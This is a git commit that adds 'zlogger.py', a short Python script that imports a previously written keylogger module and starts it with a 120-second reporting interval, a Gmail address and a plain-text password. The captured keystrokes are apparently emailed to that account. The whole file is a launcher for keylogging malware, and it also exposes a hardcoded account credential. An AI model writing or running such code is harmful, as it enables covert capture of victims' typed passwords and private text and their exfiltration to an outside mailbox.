b7e55ac1f97846b4ece1caca3cb0aa2f4aa626d6
PythonHacker <72488360+PythonHacker24@users.noreply.github.com>
2023-01-26 13:17:57 +0530

    Create zlogger.py

---
+++ #!/usr/zlogger.py
@@ -0,0 +1,6 @@
+#!/usr/share/python3
+
+import keylogger          # calling the keylogger script that was written earlier
+
+my_keylogger = keylogger.Keylogger(120, "agenthack204@gmail.com", "Pyth0nHack3r")        # keylogger was the script name and Keylogger was the class name
+my_keylogger.start()                        # my_keylogger has the instance of keylogger.Keylogger() and the start is the method that we are calling from the class
